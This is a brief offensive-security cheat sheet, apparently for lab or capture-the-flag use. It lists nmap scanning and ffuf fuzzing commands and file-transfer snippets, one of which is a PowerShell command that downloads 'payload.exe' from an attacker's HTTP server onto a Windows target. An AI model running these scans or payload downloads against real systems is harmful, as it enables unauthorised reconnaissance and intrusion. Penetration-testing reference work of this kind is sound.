# Offensive Security Cheat Sheet

Quick operator reference playbooks and command snippets for daily security research and testing.

---

### Network Scanning & Port Enumeration

```bash
# Fast SYN scan across all ports
sudo nmap -sS -p- --min-rate 2500 -T4 10.10.10.10 -oN nmap_all_ports.txt

# Detailed service and default script scan on discovered ports
sudo nmap -sC -sV -p 22,80,445,3389 10.10.10.10 -oN nmap_detailed.txt

# Fast UDP top-100 scan
sudo nmap -sU --top-ports 100 -T4 10.10.10.10 -oN nmap_udp.txt
```

---

### Web Directory & Parameter Fuzzing

```bash
# Directory discovery with ffuf
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403

# Virtual Host (VHost) fuzzing
ffuf -u http://domain.local -H "Host: FUZZ.domain.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <filter_size>
```

---

### File Transfer Commands

```bash
# Simple Python HTTP server
python3 -m http.server 8000

# PowerShell download on Windows target
powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.5:8000/payload.exe' -OutFile 'C:\Windows\Tasks\payload.exe'"

# Base64 file encode and decode on target
base64 -w 0 file.bin
# On target:
echo "BASE64_STRING" | base64 -d > file.bin
```
